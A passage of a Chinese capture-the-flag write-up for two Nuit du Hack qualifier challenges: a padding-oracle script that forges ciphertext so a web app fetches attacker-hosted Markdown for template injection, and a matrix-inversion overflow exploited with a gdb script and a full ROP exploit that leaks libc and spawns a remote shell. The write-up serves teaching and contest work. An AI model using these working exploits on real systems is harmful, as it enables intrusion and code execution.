s=["deadbeefcafedeadbeefcafe04030201b2c7da6ca163321fc0e96e98df20b58389e055de04be2972edc654d2f609d9608bc083bf5f35eba62d7faf73d7ec7fec88743a46bbd5711e9f954f7f54c211a3ef30067df218e84a474ec00dc1789b3c053fd578c86f6e87e080a63c6191289cd4f2e5178882f36097ae40214323b2bde2491de75c6603a708b61f80efc07b2da2d626137891b74c7019b040db51f468a2d6978e726e5c35ad9ce7f1dbc06cba",
"deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf441aee00f376a598270a8d830ddf58ab489e053dbbfba4b30652f718567777364a07d5b453fb6ab946cc6ce6485f6250d583fbaac9fb0d169de6184a1c1fa0a30",
"deadbeefcafedeadbeefcafe0403020131fdd089e91025df9510efa46b2085aac738ae5e03daa6495e2e4ee83283282a5be01dd6d817df2c0e69cd613c7da160a6aab9f02d175ac549feb6b674fa6f65",
"deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf440d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02"]
IV=s[0][:16]
#str4
ans=[]
for i in xrange(4):
    c=[]
    str1=s[i].decode('hex')
    #print s[i]
    #print str1
    for j in xrange(0,len(str1),N):
        c.append(str1[j:j+N])
    l=len(c)
    print l
    p=[""]*l
    for j in xrange(l-1,0,-1):
        middle=padding_oracle(N,c[j])
        print "========================middle================================"
        print j
        print middle.encode('hex')
        p[j]=xor(middle,c[j-1])
        print p[j]
    print "==========================plain==============================="
    print i
    print p
    ans.append(p)
print ans
```

由于服务器比较慢，

所以我是开了两个程序顺序反序一起跑，把第一串和第四串跑出来是个这样的东西，



```
1：https://gist.githubusercontent.com/MarkIsFaillingDownDrunk/b9ed0141c97ae6488379dafa088c04d2/raw/4129795e82bb978e78b00bcb9b9fc4b6acb44898/test.mdx10x10x10x10x10x10x10x10x10x10x10x10x10x10x10x10
4：https://raw.githubusercontent.com/dlitz/pycrypto/master/READMEx02x02
```

访问一下，内容是这个



```
# Welcome to MarkParser !
## This is a simple Markdown test.
Test for dynamic rendering :
[`{``{` config['WEBSITE_NAME'] `}``}`](/)
```

再看看它网页的内容

[![](https://p0.ssl.qhimg.com/t019b6973032197175b.png)](https://p0.ssl.qhimg.com/t019b6973032197175b.png)

这样就明白了,  

也就是说他的 view 后面直接跟的链接。他会读取链接的内容,然后进行 markdown 转换,然后在进行模板渲染。  

所以接下来的思路也就很明确很简单了,让它访问我们的网站预先放好的 md ,然后就是个 ssti 了,通过一些奇怪姿势找

到执行命令或是读取文件的函数就行了。  

这里由于有了第四个链接,所以构造一个目录如下:

第四个密文对应明文: https://raw.githubusercontent.com/dlitz/pycrypto/master/READMEx02x02

我的网页: http://xxx.xxx.xx.xxx:8000/xxxxxxxxxxxxxxxxxxxxx/master/READMEx02x02

最后一组明文和他密文解密出来的一样,这样我就可以维持最后一个分组密文以及倒数第二个分组的密文不变了。然后依

次通过 padding oracle 获取中间值,与构造的密文异或得到构造的密文,从而得到我的网址对应的密文  

至于具体 padding oracle 伪造明文的原理这里不赘述了。  

代码如下:



```
import requests
import base64
import time
url='http://markisfaillingdowndrunk.quals.nuitduhack.com/view/'
N=16
phpsession=""
ID=""
def inject(param):
    result=requests.get(url+param)
    #print result.content
    return result
def xor(a, b):
    print "length",len(a),len(b)
    return "".join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])
def pad(string,N):
    l=len(string)
    if l!=N:
        return string+chr(N-l)*(N-l)
def padding_oracle(N,cipher): ##return middle
    get=""
    for i in xrange(1,N+1):
        for j in xrange(0,256):
            padding=xor(get,chr(i)*(i-1))
            c=chr(0)*(16-i)+chr(j)+padding+cipher
            print c.encode('hex')
            result=inject(c.encode('hex'))
            if result.status_code!=500:
                print j
                get=chr(j^i)+get
                break
    return get
'''
s=["deadbeefcafedeadbeefcafe04030201b2c7da6ca163321fc0e96e98df20b58389e055de04be2972edc654d2f609d9608bc083bf5f35eba62d7faf73d7ec7fec88743a46bbd5711e9f954f7f54c211a3ef30067df218e84a474ec00dc1789b3c053fd578c86f6e87e080a63c6191289cd4f2e5178882f36097ae40214323b2bde2491de75c6603a708b61f80efc07b2da2d626137891b74c7019b040db51f468a2d6978e726e5c35ad9ce7f1dbc06cba",
"deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf441aee00f376a598270a8d830ddf58ab489e053dbbfba4b30652f718567777364a07d5b453fb6ab946cc6ce6485f6250d583fbaac9fb0d169de6184a1c1fa0a30",
"deadbeefcafedeadbeefcafe0403020131fdd089e91025df9510efa46b2085aac738ae5e03daa6495e2e4ee83283282a5be01dd6d817df2c0e69cd613c7da160a6aab9f02d175ac549feb6b674fa6f65",
"deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf440d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02"]
IV=s[0][:16]
#str4
ans=[]
for i in xrange(4):
    c=[]
    str1=s[i].decode('hex')
    #print s[i]
    #print str1
    for j in xrange(0,len(str1),N):
        c.append(str1[j:j+N])
    l=len(c)
    print l
    p=[""]*l
    for j in xrange(l-1,0,-1):
        middle=padding_oracle(N,c[j])
        print "========================middle================================"
        print j
        print middle.encode('hex')
        p[j]=xor(middle,c[j-1])
        print p[j]
    print "==========================plain==============================="
    print i
    print p
    ans.append(p)
print ans
'''
cipher=[
        "deadbeefcafedeadbeefcafe04030201",
        "52208110d1a06ce628ff8e10f4cbc1aa",
        "96ac276f57b6d80e50df1050c455fdf4",
        "40d56ae51399ceb30b5b69153ddc2302",
        "19e3f662023665e8885c90867b8c3a02"
        ]
middle=[
        'b6d9ca9fb9c4f182cc8ebdd0636a7669',
        '2742f463b4d20f89468beb7e80e5a2c5',
        'fb8343033ec2a22120a67322bd25899b',
        '6fb80b9667fcbc9c591e285170992100'
        ]
ans   =[
        "http://xxx.xxx.x",
        "x.xxx:8000/xxxxx",
        "xxxxxxxxxxxxxxxx",
        "/master/READMEx02x02"
       ]
tmp_ans=[""]*5
tmp_ans[4]=cipher[4]
tmp_ans[3]=cipher[3]
tmp_middle=middle[2].decode('hex')
tmp_ans[2]=xor(ans[2],tmp_middle).encode("hex")
tmp_middle=padding_oracle(N,tmp_ans[2].decode("hex"))
print tmp_middle.encode('hex')   #"9d41e1434f05be3bea284b8d2eb8928b".decode('hex')
tmp_ans[1]=xor(ans[1],tmp_middle).encode("hex")
tmp_middle=padding_oracle(N,tmp_ans[1].decode("hex"))
print tmp_middle.encode('hex')   #"c05b49fef1d14b17aa0dd98a591ea57f".decode('hex')
tmp_ans[0]=xor(ans[0],tmp_middle).encode("hex")
view="".join(i for i in tmp_ans)
print view
#a82f3d8ecbfe64269a39f7bb6f2e8b4bae6fd0767b3f860bda1864f556c0eaf383fb3b7b46bada5958de0b5ac55df1e340d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02
```

通过上述代码,我得到我的这个链接 http://xxx.xxx.xx.xxx:8000/xxxxxxxxxxxxxxxxxxxxx/master/README 对应的密文是

a82f3d8ecbfe64269a39f7bb6f2e8b4bae6fd0767b3f860bda1864f556c0eaf383fb3b7b46bada5958de0b5ac55df1e340d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02

然后修改我的网站的README的内容为 

[![](https://p2.ssl.qhimg.com/t01113e809a3d4eb248.png)](https://p2.ssl.qhimg.com/t01113e809a3d4eb248.png)

注意下我的这个内容外面包了两个反撇号，因为我们刚才说了，他会读取链接的内容，然后进行markdown转换，然后在进行模板渲染。markdown，转换在先，很多我们需要用的符号在markdown里面都有特殊语义会被转换，加上这两个反撇号就好了。 

然后尝试访问

[http://markisfaillingdowndrunk.quals.nuitduhack.com/view/a82f3d8ecbfe64269a39f7bb6f2e8b4bae6fd0767b3f860bda1864f556c0eaf383fb3b7b46bada5958de0b5ac55df1e340d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02](http://markisfaillingdowndrunk.quals.nuitduhack.com/view/a82f3d8ecbfe64269a39f7bb6f2e8b4bae6fd0767b3f860bda1864f556c0eaf383fb3b7b46bada5958de0b5ac55df1e340d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02) 

结果如下： 

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01cf8f79fd7aea2a3f.png)

成功了,  

好的,接下来就找出 SSTI 的payload执行一波命令,发现失败了,经过一番测试才知道题目用的环境是 python3 ,而平时

做的题目之类的都是 python2 ,那么开始在python3下面寻找姿势。  

最后 payload 如下:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01789124181d5955e0.png)

直接访问得到flag如下:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01bdfd086729e34f27.png)



**escapeTheMatrix**

题目是个矩阵求逆的过程，如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t018e8a7eb3a9fdaaf1.png)

初始化的时候，矩阵行和列最大可为16*16，如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01af4e5aca588f35f9.png)

但是逆矩阵的存储最大只有15*15，因此可以溢出，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0165e53bbfd6ba97f0.png)

矩阵里面存储的是double类型的数据，如下所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t016974c30ec98e8a89.png)

计算时会损失精度，数值不好控制，但是如果数量级一样的话，尾数部分占了52bit，是相对比较精确的，为了提高精度，将参与的数值计算的数取得越少越好，及将矩阵里面存储的数值绝大部分设为0，要求逆矩阵，那么最好是从单位矩阵开始修改，如下：



```
arrays = [
1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0, 
0,0,0,0,0,a,b,c,d,e, f, g, h,i,1,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1]
```

如果该矩阵是存储的结果即逆矩阵，那么此时从a开始的位置，会在函数返回时当成rip，矩阵求逆的过程是可逆的，因此，为了求得固定的逆矩阵，可以将结果当成输入，即把a~i处的值替换成目的结果，求出最原始的的值，由于输入前也不好控制，因此在这里，直接写个gdb脚本来设置如下： 



```
target_name = "escapeTheMatrix_patch"
gdb.execute('file %s'%target_name)
proc_pid = execute_external_output("pidof %s"%target_name)[0].split(' ')[0]
gdb.execute("attach %s"%proc_pid)
gdb.execute("b *0x401018")
gdb.execute("c")
val_list = [0x401c33, 
0x400a60, 
0x401c31, 
0x603020,
0x400D75
]
for i in range(len(val_list)):
gdb.execute("set *(long long*)($rsi+0x20+0x10*14*8+(5+%d)*8)=0x%x"%(i, val_list[i]))
gdb.execute("b *0x4010F2")
gdb.execute("c")
```

将最终的结果，求出来以后，转换得到高精度的值，即求得小数点后面位数越多越好，如下：



```
#include &lt;stdio.h&gt;
int main()
`{`
while (1)
`{`
long long val;
printf("&gt;&gt; ");
scanf("%llx", &amp;val);
printf("%.32en", *(double *)&amp;val);
`}`
`}`
```

这样求出的结果直接转换成输入即可，最终利用代码如下：



```
from zio import *
is_local = True
is_local = False
binary_path = "./escapeTheMatrix_patch"
libc_file_path = ""
#libc_file_path = "./libc.so.6"
ip = "escapethematrix.quals.nuitduhack.com"
port = 50505
if is_local:
target = binary_path
else:
target = (ip, port)
def get_io(target):
r_m = COLORED(RAW, "green")
w_m = COLORED(RAW, "blue")
#io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m, env=`{`"LD_PRELOAD":libc_file_path`}`)
return io
def pwn_with_array(io, val_list):
arrays = [
1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0, 
#1,2,3,0xcd,0xee,0xff,0x5,6,7,8,9,2,2,2,2,2,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1]
for i in range(len(val_list)):
arrays[14 * 16 + 5 + i] = val_list[i]
io.read_until(" : ")
io.writeline(str(16))
io.read_until(" : ")
io.writeline(str(16))
io.read_until(" :")
payload = ""
for item in arrays:
payload += str(item) + ","
io.writeline(payload[:-1])
io.read_until("This is your result")
io.read_until("0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,nn")
return 
def pwn(io):
#offset info
if is_local:
#local
offset_puts                = 0x6f690
offset_system = 0x45390
else:
#remote
offset_system = 0x45800
offset_puts                = 0x70a90
p_rdi_ret_val = -2.07582817451185170402836984431807e-317
puts_got_val = -3.11447916067854977526319411883167e-317
puts_plt_val = -2.07357375296987809604729216091621e-317
#puts_got -8
puts_got_8_val = -3.11447520815338304529084070628132e-317
main_addr_val = -2.07424074159176377888193052878658e-317
show_info_val = -2.07415428010374156073669962924783e-317
get_buff_val = -2.07396357076444683957064747369378e-317
val_list = []
val_list.append(p_rdi_ret_val)
val_list.append(puts_got_val)
val_list.append(puts_plt_val)
val_list.append(main_addr_val)
"""
p_rdi_ret = 0x0000000000401c33
puts_plt                   = 0x0000000000400a60
p_rsi_r15_ret = 0x0000000000401c31
get_buff_addr = 0x400D75
puts_got = 0x0000000000603020
"""
pwn_with_array(io, val_list)
data = io.read(6)+"x00"*2
print repr(data)
puts_addr = l64(data)
libc_base = puts_addr - offset_puts
system_addr = libc_base + offset_system
print hex(libc_base)
print hex(system_addr)
val_list = []
val_list.append(p_rdi_ret_val)
val_list.append(puts_got_8_val)
val_list.append(get_buff_val)
val_list.append(p_rdi_ret_val)
val_list.append(puts_got_8_val)
val_list.append(puts_plt_val)
pwn_with_array(io, val_list)
io.writeline("/bin/shx00" + l64(system_addr))
io.interact()
io = get_io(target)
pwn(io)
```

flag如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0136c0bc859f84f579.png)
